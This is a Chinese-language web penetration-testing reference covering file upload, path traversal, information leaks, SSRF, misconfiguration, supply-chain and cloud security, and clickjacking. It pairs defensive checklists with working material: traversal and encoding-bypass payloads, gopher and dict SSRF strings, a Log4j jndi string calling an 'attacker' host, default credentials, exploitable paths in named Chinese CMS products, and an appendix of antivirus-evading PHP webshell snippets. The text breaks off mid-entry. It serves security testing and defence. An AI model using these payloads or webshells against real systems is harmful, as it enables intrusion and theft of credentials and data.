  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 竞争条件利用

```
原理: 上传后删除存在时间差
利用: 多线程上传+访问,在删除前执行恶意代码
技巧: 恶意文件先生成一个新文件到其他位置,新文件不被清理机制删除
```

### 1.9 防御措施

1. 白名单验证: 只允许特定扩展名(`.jpg .png .gif .pdf`)
2. 多层验证: 扩展名 + MIME(finfo_file) + 文件头 + getimagesize()
3. 文件重命名: `uniqid() + 固定扩展名`，彻底去除原始文件名
4. 禁止执行: 上传目录禁止脚本执行权限
5. 权限最小化: `chmod 0644`，Web用户不可执行
6. 先检后存: 先验证再存储，使用原子操作防竞争条件
7. 路径隐藏: 不返回完整路径，使用CDN或随机化URL

---

## 二、文件遍历与文件包含

### 2.1 漏洞本质

```
用户输入空间 -> [信任边界失效] -> 文件系统空间
核心: 开发者认为"用户输入=文件名"，攻击者利用"用户输入=路径指令"
```

### 2.2 漏洞参数识别

高频参数名(按出现频率):

```
文件类: filename, filepath, path, file, filePath, hdfile, inputFile
下载类: download, down, attachment, attach, doc
读取类: read, load, get, fetch, open, input
模板类: template, tpl, page, include, temp
通用类: url, src, dir, folder, resource, name
```

高危功能点(TOP 5):
1. 文件下载接口 (27次) - `down.php, download.jsp`
2. 文件预览功能 (17次) - `view.php, preview.jsp`
3. 附件管理 (6次) - `attachment.php`
4. 图片加载 (5次) - `pic.php, image.jsp`
5. 日志查看 (4次) - `log.php, viewlog.jsp`

### 2.3 目录遍历Payload

基础遍历:

```bash
../                          # Linux标准
..\..\                       # Windows标准
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

编码绕过:

```bash
# URL单次编码
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URL双重编码
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8超长编码 (GlassFish特有)
%c0%ae%c0%ae/%c0%af

# 混合编码
..%2f  |  %2e%2e/  |  ..%c0%af
```

特殊绕过:

```bash
# 空字节截断 (PHP<5.3.4 / Java旧版本)
../../../etc/passwd%00.jpg

# 问号截断
../../../WEB-INF/web.xml%3f

# 路径混淆
....//  |  ....\/  |  ..\/  |  ./../../

# 绝对路径/协议绕过
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 敏感文件路径速查表

Linux系统:

```bash
/etc/passwd                    # 用户列表(验证首选)
/etc/shadow                    # 密码哈希
/etc/hosts                     # 主机映射
/root/.ssh/id_rsa              # SSH私钥
/root/.bash_history            # 命令历史
/proc/self/environ             # 进程环境变量
/etc/nginx/nginx.conf          # Nginx配置
/etc/my.cnf                    # MySQL配置
```

Windows系统:

```bash
C:\windows\win.ini             # 系统配置(验证首选)
C:\boot.ini                    # 启动配置(XP/2003)
C:\inetpub\wwwroot\web.config  # IIS应用配置
C:\windows\system32\config\sam # SAM数据库
```

Java Web:

```bash
WEB-INF/web.xml                         # 核心配置(验证首选)
WEB-INF/classes/jdbc.properties          # 数据库配置
WEB-INF/classes/applicationContext.xml   # Spring配置
WEB-INF/classes/hibernate.cfg.xml        # Hibernate配置
```

PHP应用:

```bash
config.php | config.inc.php | db.php | conn.php    # 通用配置
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # 核心配置(含连接字符串)
../web.config              # 上级目录配置
```

### 2.5 防御措施

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. 路径规范化
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. 验证在允许目录内
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. 白名单扩展名
    # 4. 验证文件存在
    return full_path
```

关键原则: 路径规范化(realpath/normpath) -> 目录边界校验 -> 白名单验证 -> 最小权限运行

---

## 三、信息泄露

### 3.1 漏洞本质

```
信息泄露本质: 攻击面暴露 -> 信任链断裂 -> 纵深渗透
规律: 一个泄露点可导致整条信任链崩溃
      源码 -> 配置 -> 数据库 -> 内网 -> 全部沦陷
```

### 3.2 敏感文件路径字典

版本控制泄露:

```bash
# Git泄露 (检测优先级最高)
/.git/config          # 含远程仓库地址
/.git/HEAD            # 当前分支
/.git/index           # 暂存区索引
/.git/logs/HEAD       # 操作日志

# SVN泄露
/.svn/entries         # SVN 1.6及以下
/.svn/wc.db           # SVN 1.7+ SQLite数据库

# 利用工具: dvcs-ripper, GitHack, svn-extractor
```

备份文件泄露:

```bash
# 压缩包备份 (530例命中)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# SQL备份 (136例命中)
/backup.sql | /database.sql | /db.sql | /dump.sql

# 配置备份 (101例命中)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

配置文件泄露:

```bash
# 通用
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

探针/调试/日志文件:

```bash
# 探针文件
/phpinfo.php | /info.php | /test.php | /probe.php

# 日志文件
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# 管理界面
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 探测方法论

```
Phase 1 被动收集: 响应头(Server/X-Powered-By) -> 错误页面 -> robots.txt -> 源码注释/JS
Phase 2 定向探测: 版本控制(.git/.svn) -> 备份文件(域名/日期) -> 敏感路径
Phase 3 搜索引擎: Google Hacking语法
```

Google Hacking速查:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 信息利用链

```
源码泄露   -> 配置文件 -> 数据库凭证 -> 数据库接管 -> 服务器提权
版本控制   -> 源码审计 -> SQL注入等  -> 管理权限   -> 文件上传getshell
配置泄露   -> DB连接串 -> 数据库    -> 用户数据   -> 业务接管
日志泄露   -> Session  -> 身份劫持  -> 业务数据   -> 横向移动
API接口    -> 凭证/密码 -> 解密     -> 批量控制   -> 全面渗透
第三方凭证 -> 短信/OSS -> 验证码    -> 账户接管   -> 数据泄露
```

### 3.5 防御措施

Nginx安全配置:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

Apache安全配置:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

CI/CD集成: 部署前扫描敏感文件 -> 禁止.git/.svn部署 -> 配置文件加密

---

## 四、SSRF与协议利用

### 4.1 漏洞本质

```
SSRF本质: 服务端代为发起请求,攻击者控制请求目标
风险: 内网探测 -> 内部服务访问 -> 文件读取 -> 命令执行
```

### 4.2 常见触发点

- 文件下载功能中的url参数
- 图片加载/代理功能
- 网页预览/截图功能
- 导入URL功能
- Webhook/回调配置

### 4.3 协议利用

```bash
# file:// - 任意文件读取
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - 端口探测/服务交互
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - 构造任意TCP请求
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - 内网探测
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # 云元数据
```

### 4.4 绕过技巧

```bash
# IP变形绕过
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS重绑定: 解析到外部IP再快速切换到127.0.0.1
# 短链接/302跳转: 通过外部URL跳转到内网地址
```

### 4.5 防御措施

1. 白名单限制: 限制请求目标域名/IP
2. 协议限制: 仅允许http/https
3. 内网隔离: 禁止请求RFC1918地址和127.0.0.1
4. DNS解析验证: 解析后再次校验IP归属
5. 禁用重定向: 或限制重定向次数并再次校验

---

## 五、服务器配置错误

### 5.1 解析配置错误

| 问题 | 风险 | 检查方法 |
|-----|------|---------|
| IIS 6.0解析漏洞未修复 | `shell.asp;.jpg`可执行 | 上传含分号文件名测试 |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`解析为PHP | 上传图片访问`/img.jpg/x.php` |
| Apache多后缀解析 | `shell.php.xxx`被解析 | 上传双扩展名文件测试 |
| 上传目录可执行脚本 | Webshell直接运行 | 上传脚本文件测试 |
| 目录列表开启 | 暴露所有文件 | 访问目录URL查看 |

### 5.2 权限配置错误

| 问题 | 风险 | 修复 |
|-----|------|------|
| Web进程高权限运行 | 提权后直接root | 使用低权限用户运行 |
| 上传目录777权限 | 任意写入+执行 | 设置644/755 |
| 配置文件可读 | 凭证泄露 | 移出Web目录,限制权限 |
| 管理后台无IP限制 | 公网可访问 | IP白名单/VPN |

### 5.3 默认配置风险

```bash
# 默认管理后台路径
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# 默认凭证 (高频)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# 默认调试端口
8080 (Tomcat) | 9090 (管理) | 3306 (MySQL外网)
6379 (Redis无密码) | 27017 (MongoDB无认证)
```

### 5.4 Spring Boot Actuator泄露

```bash
/actuator/env          # 环境变量(含密码)
/actuator/configprops  # 配置属性
/actuator/heapdump     # 堆内存转储(含敏感数据)
/actuator/mappings     # 所有URL映射
```

---

## 六、综合实战Checklist

### 6.1 文件上传测试

- [ ] 扫描常见编辑器路径(FCKeditor/eWebEditor/UEditor)
- [ ] 禁用JavaScript测试前端验证
- [ ] 测试扩展名绕过: 大小写/双写/特殊后缀/%00截断/分号截断
- [ ] 修改Content-Type为image/jpeg
- [ ] 添加GIF89a文件头 / 制作图片马
- [ ] 识别服务器类型,测试对应解析漏洞
- [ ] 测试.htaccess/.user.ini上传劫持解析
- [ ] 分析文件命名规则,测试路径爆破
- [ ] 测试竞争条件上传

### 6.2 文件遍历测试

- [ ] 识别文件相关参数(filename/path/file/url/download)
- [ ] 基础遍历: `../../../../../etc/passwd`
- [ ] Windows测试: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL编码绕过: `%2e%2e%2f` / 双重编码 `%252e%252e%252f`
- [ ] Unicode绕过: `%c0%ae%c0%ae/`
- [ ] 空字节截断: `../etc/passwd%00.jpg`
- [ ] 绝对路径: `/etc/passwd` / `file:///etc/passwd`

### 6.3 信息泄露扫描

- [ ] 版本控制: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] 备份文件: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] 配置备份: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] 环境文件: `/.env` `/.env.production`
- [ ] 探针文件: `/phpinfo.php` `/info.php` `/test.php`
- [ ] 日志文件: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] 管理界面: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hacking语法辅助搜索

### 6.4 SSRF测试

- [ ] 识别URL/代理/回调参数
- [ ] 测试file:///etc/passwd协议读取
- [ ] 测试内网地址: http://127.0.0.1:port
- [ ] 云元数据: http://169.254.169.254/latest/meta-data/
- [ ] IP变形绕过: 十六进制/十进制/省略写法
- [ ] DNS重绑定/302跳转绕过

---

## 附录A: 高危CMS漏洞速查

| CMS/系统 | 漏洞类型 | 路径 | 条件 |
|---------|---------|------|------|
| 万户OA ezOffice | 任意上传 | `/defaultroot/dragpage/upload.jsp` | %00截断 |
| 用友协作平台 | 任意上传 | `/oaerp/ui/sync/excelUpload.jsp` | 绕JS+爆破文件名 |
| 金蝶GSiS | 任意上传 | `/kdgs/core/upload/upload.jsp` | 注册用户 |
| 金智教育epstar | 文件遍历 | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | 无需认证 |
| 致远OA | 日志泄露 | `/ctp.log` | 直接访问 |

## 附录B: Webshell免杀技巧速查

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // 变量拼接
array_map('ass'.'ert', array($_POST['x']));            // 回调函数
$f = create_function('', $_POST['x']); $f();           // 动态函数
set_exception_handler('system');                        // 异常处理
throw new Exception($_POST['cmd']);
```

## 附录C: 通用漏洞URL模式

```bash
# PHP文件遍历
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64编码路径]

# JSP文件遍历
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX文件遍历
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin特有
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **供应链/云部署/框架CVE** → 已迁移至 [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP走私/WebSocket/OAuth** → 已迁移至 [web-modern-protocols.md](web-modern-protocols.md)

*基于WooYun漏洞库(88,636条)提炼 | 仅供安全研究与防御参考*


---

## Source: web-deployment-security.md

Path: references\web-deployment-security.md

# Web部署与供应链安全

> **来源**: 基于WooYun漏洞库实战经验 + 云安全最佳实践 + OWASP供应链安全指南提炼
> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析
> **相关**: AI应用容器逃逸测试 → [ai-baseline-security.md](ai-baseline-security.md)

---

## 一、供应链与组件安全

### 1.1 漏洞本质

```
供应链风险 = 第三方代码信任 × 传递性依赖深度 × 更新滞后
```

应用中 70-90% 的代码来自开源组件，一个高危组件漏洞可影响数万项目（如 Log4Shell、Polyfill.io）。

### 1.2 前端供应链

**npm/yarn 依赖风险**

| 攻击类型 | 说明 | 典型案例 |
|----------|------|----------|
| 恶意包 | 名称相似的恶意包(typosquatting) | `crossenv` 窃取环境变量 |
| 原型污染 | `lodash`/`jQuery` 原型链污染 | CVE-2019-10744 |
| 依赖劫持 | 维护者账号被接管后植入后门 | `event-stream` 挖矿 |
| CDN投毒 | 公共CDN托管的JS被篡改 | Polyfill.io供应链攻击 |
| 构建注入 | package.json scripts钩子执行恶意命令 | `postinstall` 脚本攻击 |

**检测方法**

```bash
# 审计已知漏洞
npm audit
yarn audit

# 检查过时依赖
npm outdated

# 查看依赖树深度
npm ls --all | head -100

# 检查可疑的安装脚本
npm pack --dry-run  # 查看将要安装的文件
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 后端供应链

**Python/pip**

```bash
# 已知漏洞审计
pip-audit
safety check

# 查看依赖
pip list --outdated
pipdeptree  # 可视化依赖树
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# 查看依赖树
mvn dependency:tree
```

**常见高危组件漏洞速查**

| 组件 | CVE | 影响 | 检测 |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoType反序列化 |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-Type注入 |
| Jackson | CVE-2019-12384 | RCE | 多态反序列化 |
| Commons-Collections | CVE-2015-6420 | RCE | Java反序列化链 |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTML注入 |
| Lodash | CVE-2021-23337 | RCE | 模板注入 |

### 1.4 Docker镜像供应链

```bash
# 镜像漏洞扫描
trivy image <image:tag>
grype <image:tag>

# 检查基础镜像
docker inspect <image> | grep -i "rootfs\|created\|author"

# 查看镜像层历史(发现隐藏文件/密钥)
docker history --no-trunc <image>
```

**风险点**：
- 使用 `latest` 标签而非固定版本
- 基础镜像过大(包含不必要工具如gcc/curl)
- Dockerfile中硬编码密钥/凭据
- 以root用户运行容器

### 1.5 SCA工具推荐

| 工具 | 语言/场景 | 特点 |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | 内置,免费 |
| `pip-audit` / `safety` | Python | 免费 |
| OWASP Dependency-Check | Java/.NET | 开源,支持多语言 |
| Snyk | 全语言 | SaaS,最全漏洞库 |
| Trivy | 容器/IaC/SBOM | 开源,速度快 |
| Grype | 容器镜像 | 开源,Anchore出品 |
| Renovate / Dependabot | 自动升级 | GitHub集成 |

### 1.6 SBOM(软件物料清单)

```bash
# 生成 SBOM (CycloneDX格式)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# 生成 SBOM (SPDX格式)
syft <image> -o spdx-json > sbom.spdx.json   # 容器镜像
```

SBOM 用途：合规审计、许可证合规、漏洞追踪、供应链透明度。

### 1.7 防御措施

- **锁定版本**: 使用 `package-lock.json` / `Pipfile.lock` / `pom.xml` 固定版本
- **最小依赖**: 定期清理未使用依赖，避免传递性依赖膨胀
- **CI集成**: 在CI/CD中加入SCA扫描，漏洞阻断构建
- **私有仓库**: 使用Nexus/Verdaccio代理，避免直接拉取公共仓库
- **签名验证**: npm支持`npm audit signatures`验证包签名
- **定期更新**: 设置Dependabot/Renovate自动创建升级PR

---

## 二、云部署与服务器安全

### 2.1 风险本质

```
部署风险 = 默认配置信任 × 暴露面积 × 运维疏忽
```

应用代码安全不等于系统安全。部署环境的错误配置往往是攻击者最先利用的突破口。

### 2.2 服务器加固检查

**端口与服务**

```bash
# 扫描开放端口
nmap -sV -p- <target>

# 高危端口速查
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(管理) 2375(Docker API) 10250(Kubelet)
```

| 检查项 | 安全配置 | 风险 |
|--------|----------|------|
| SSH | 禁用root登录、密钥认证、非22端口 | 暴力破解 |
| 数据库端口 | 仅绑定127.0.0.1/内网IP | 未授权访问 |
| Redis | 设置密码、禁用外网、rename危险命令 | RCE(写webshell/crontab/ssh) |
| MongoDB | 启用认证、绑定内网 | 数据泄露 |
| Docker API | 绑定Unix Socket、启用TLS | 容器逃逸/RCE |
| Elasticsearch | X-Pack认证、禁用外网 | 数据泄露 |
| Kubernetes API | RBAC、网络策略、审计日志 | 集群接管 |

**操作系统加固**

```bash
# Linux加固检查
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # 非法root用户
find / -perm -4000 2>/dev/null        # SUID文件
crontab -l                            # 定时任务后门
last -20                              # 最近登录记录
ss -tlnp                              # 监听端口
iptables -L -n                        # 防火墙规则
```

### 2.3 TLS/SSL/HTTPS 配置

**测试方法**

```bash
# SSL/TLS配置检查
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# 在线检查
# https://www.ssllabs.com/ssltest/
```

**常见问题**

| 问题 | 风险 | 修复 |
|------|------|------|
| TLS 1.0/1.1 未禁用 | BEAST/POODLE攻击 | 仅启用TLS 1.2+ |
| 弱密码套件(RC4/DES/MD5) | 降级攻击 | 使用AES-GCM/ChaCha20 |
| 证书过期/自签名 | 中间人攻击 | 使用Let's Encrypt/CA证书 |
| 缺少HSTS头 | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| 混合内容(HTTP+HTTPS) | 内容劫持 | 全站HTTPS+CSP |

**Nginx安全配置参考**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # 安全头
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # 隐藏版本
    server_tokens off;
    
    # 禁止目录列表
    autoindex off;
}
```

### 2.4 云服务安全

**通用云风险 (AWS/Azure/GCP/阿里云)**

| 风险 | 检测方法 | 影响 |
|------|----------|------|
| S3/OSS桶公开 | `aws s3 ls s3://bucket --no-sign-request` | 数据泄露 |
| IAM权限过宽 | 检查`*`通配符策略 | 权限提升 |
| 安全组全开 | 检查`0.0.0.0/0`入站规则 | 暴露内部服务 |
| 密钥硬编码 | `trufflehog`/`gitleaks` 扫描代码仓库 | 账户接管 |
| 元数据服务 | `curl http://169.254.169.254/` (SSRF利用) | 凭据窃取 |
| 日志未开启 | CloudTrail/ActionTrail审计 | 无法溯源 |

**PaaS平台风险 (Railway/Vercel/Heroku/Netlify)**

| 风险 | 说明 | 检测 |
|------|------|------|
| 环境变量泄露 | 构建日志/错误页面暴露ENV | 查看公开构建日志 |
| 域名接管 | CNAME指向已删除的PaaS应用 | `dig CNAME <domain>` 检查悬挂记录 |
| 共享运行时逃逸 | 多租户容器间隔离不足 | 探测同节点服务 |
| 部署凭据泄露 | API Token在CI配置中明文 | 审查CI/CD配置文件 |
| 函数注入 | Serverless函数的事件注入 | 测试事件参数可控性 |

**云密钥泄露检测**

```bash
# 代码仓库扫描
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# 常见泄露位置
.env / .env.production / .env.local
docker-compose.yml
CI配置: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
前端代码: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 容器与编排安全

> **AI应用容器逃逸**: 针对AI Agent/LLM部署环境的容器逃逸测试方法论 → [ai-baseline-security.md](ai-baseline-security.md) §二十

**Docker安全检查**

```bash
# 容器以非root运行
docker inspect <container> | grep '"User"'

# 检查特权模式
docker inspect <container> | grep '"Privileged"'

# 检查挂载(敏感目录)
docker inspect <container> | grep -A10 '"Mounts"'

# 检查Capabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Kubernetes安全检查**

```bash
# RBAC审计
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Pod安全
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Secret明文检查
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# 网络策略
kubectl get networkpolicy -A
```

### 2.6 CI/CD流水线安全

| 风险 | 说明 | 防御 |
|------|------|------|
| 密钥明文存储 | Pipeline配置中硬编码密钥 | 使用Vault/Sealed Secrets |
| 依赖不可信 | CI中拉取未验证的构建工具 | 锁定CI镜像版本 |
| 构建注入 | PR中修改CI配置执行恶意代码 | Fork PR需审批后才能触发CI |
| 制品篡改 | 构建产物未签名 | Cosign/Notary签名 |
| 权限过宽 | CI Token拥有管理员权限 | 最小权限Token |

### 2.7 部署安全Checklist

**服务器**
- [ ] SSH密钥登录,禁用密码和root
- [ ] 防火墙仅开放必要端口(80/443)
- [ ] 数据库/缓存仅监听内网
- [ ] 定期更新OS和中间件补丁
- [ ] 启用审计日志和入侵检测

**HTTPS**
- [ ] TLS 1.2+ 且禁用弱密码套件
- [ ] HSTS头 + CAA记录
- [ ] 证书自动续期(Let's Encrypt)

**云服务**
- [ ] IAM最小权限 + MFA
- [ ] 存储桶私有 + 加密
- [ ] 安全组限制来源IP
- [ ] CloudTrail/审计日志启用
- [ ] 密钥通过KMS/Vault管理,不硬编码

**容器**
- [ ] 非root用户运行
- [ ] 只读文件系统
- [ ] 无特权模式 + 最小Capabilities
- [ ] 镜像扫描(Trivy/Grype)
- [ ] 网络策略隔离Pod间通信

**CI/CD**
- [ ] 密钥通过Secret管理,不在配置文件中
- [ ] SCA扫描集成到构建流水线
- [ ] 制品签名验证
- [ ] Fork PR审批后才触发构建

---

## 三、通用Web框架CVE检测方法论

> 适用于 Next.js、Spring Boot、Django、Rails、Express、Laravel 等任何Web框架的已知CVE检测与利用验证

### 3.1 框架指纹识别

**自动化指纹采集**

| 指纹来源 | 检测方法 | 信息提取 |
|----------|----------|----------|
| HTTP响应头 | 检查`X-Powered-By`、`Server`、`X-Framework` | 框架名称和版本 |
| Cookie名称 | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | 框架类型 |
| 默认错误页面 | 触发404/500，分析页面特征、样式、文案 | 框架+调试模式 |
| 静态资源路径 | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | 框架+构建工具 |
| JS文件内容 | 搜索`webpack`/`vite`/`turbopack`标识、框架版本字符串 | 精确版本号 |
| Source Map | 访问`*.js.map`检查是否泄露、分析import路径 | 框架+依赖库完整列表 |
| 元标签/注释 | HTML中的`<meta name="generator">`、构建注释 | 框架版本 |
| package.json泄露 | 访问`/package.json`、`/composer.json`、`/Gemfile.lock` | 全部依赖及精确版本 |

```
指纹识别流程:
1. 被动收集 → 响应头、Cookie、HTML、JS分析
2. 主动探测 → 默认路径、错误触发、配置文件访问
3. 版本锁定 → 精确到主版本.次版本.补丁版本
4. CVE匹配 → NVD/Snyk/GitHub Advisory 查询
```

### 3.2 CVE检索与PoC验证

**CVE数据源**

| 数据源 | URL | 特点 |
|--------|-----|------|
| NVD | nvd.nist.gov | 官方CVE库，CVSS评分 |
| GitHub Advisory | github.com/advisories | 开源项目漏洞，含PoC链接 |
| Snyk | snyk.io/vuln | 依赖级精确匹配 |
| Exploit-DB | exploit-db.com | 已验证PoC和EXP |
| PacketStorm | packetstormsecurity.com | 安全公告和利用代码 |
| 框架ChangeLog | 框架官方Release Notes | 安全修复细节 |

**通用CVE验证流程**

```
1. 版本比对
   确认版本号 → 查CVE影响范围(affected versions) → 确认是否在影响范围内

2. PoC复现
   a. 搜索公开PoC (GitHub/Exploit-DB/安全博客)
   b. 理解漏洞原理(补丁diff是最佳资料)
   c. 在测试环境构造请求验证
   d. 注意: 生产环境仅验证触发条件,不执行破坏性Payload

3. 补丁分析(L4防御反推)
   a. 对比修复前后代码diff → 理解修复了什么
   b. 反推: 修复前的处理逻辑中哪里存在缺陷
   c. 思考: 修复是否完整?是否存在绕过修复的可能?
```

### 3.3 常见框架攻击面分类

| 攻击面类型 | 通用检测方法 | 典型漏洞模式 |
|-----------|-------------|-------------|
| **路由/中间件绕过** | 路径规范化测试: `//path`、`/./path`、`/%2e/path`、大小写变体、特殊请求头伪造 | 认证绕过、鉴权跳过 |
| **模板/渲染注入** | 在参数中注入模板语法: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **反序列化** | 识别序列化格式(`ac ed 00 05`/`O:`/`rO0AB`), 发送恶意序列化数据 | Java/PHP/Python反序列化RCE |
| **Server Actions/RPC** | 拦截框架特有的RPC调用,分析端点标识,直接调用绕过前端校验 | CSRF、输入验证绕过 |
| **SSR/RSC注入** | 拦截并修改服务端渲染参数(如`_rsc`/`__data`/`loader`),构造异常Payload | 服务端代码执行 |
| **配置文件泄露** | 遍历常见配置路径: `.env`、`web.config`、`application.yml`、`settings.py` | 密钥/凭据泄露 |
| **调试端点** | 检查框架调试模式: `/debug`、`/_debug`、`/__inspect`、`/graphql`(introspection) | 信息泄露→RCE |
| **原型污染(JS)** | JSON请求体中注入`{"__proto__":{"isAdmin":true}}`或`{"constructor":{"prototype":{"x":1}}}` | 权限提升、DoS |
| **缓存投毒** | 操纵缓存Key相关头(`X-Forwarded-Host`/`X-Original-URL`), 验证响应是否被缓存 | 存储型XSS、钓鱼 |

### 3.4 框架安全通用Checklist

```
[ ] 确认框架及所有依赖的精确版本
[ ] 查询NVD/Snyk/GitHub Advisory对应CVE
[ ] 验证所有高危CVE(CVSS≥7.0)是否已修复
[ ] Source Map是否已禁用
[ ] 调试模式是否已关闭
[ ] 错误页面是否泄露堆栈/路径/版本
[ ] 默认配置文件路径是否可访问
[ ] 中间件/路由鉴权是否可通过路径变体绕过
[ ] API端点是否全部需要认证(删除Cookie/Token测试)
[ ] 安全响应头是否完整(CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] CSRF保护是否覆盖所有状态变更操作
[ ] 框架特有的RPC/Action端点是否有独立鉴权
```

---

*基于WooYun漏洞库(88,636条)提炼 + 云/供应链安全最佳实践 | 仅供安全研究与防御参考*


---

## Source: 01-clickjacking.md

Path: references\web-playbook-01-clickjacking.md

# 点击劫持
English: Clickjacking
- Entry Count: 2
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 基础点击劫持
- ID: clickjacking-basic
- Difficulty: beginner
- Subcategory: 基础
- Tags: clickjacking, ui-redressing, iframe
- Original Extracted Source: original extracted web-security-wiki source/clickjacking-basic.md
Description:
通过透明iframe覆盖诱使用户在不知情的情况下点击隐藏的恶意按钮或链接
Prerequisites:
- 目标站点允许被iframe嵌套
- 目标未设置X-Frame-Options响应头
- 目标未配置CSP frame-ancestors策略
- HTML/CSS基础知识
Execution Outline:
1. 检测X-Frame-Options和CSP
2. 基础透明iframe覆盖POC
3. 多步骤拖拽劫持(Drag-and-Drop)
4. 利用CSS pointer-events绕过
## 点击劫持+XSS
- ID: clickjacking-xss
- Difficulty: intermediate
- Subcategory: XSS
- Tags: clickjacking, xss
- Original Extracted Source: original extracted web-security-wiki source/clickjacking-xss.md
Description:
将点击劫持与XSS攻击结合，先通过点击劫持触发XSS攻击向量获取更深层的控制
Prerequisites:
- 目标存在XSS漏洞
- 目标允许被iframe嵌套
- XSS payload可被点击触发
Execution Outline:
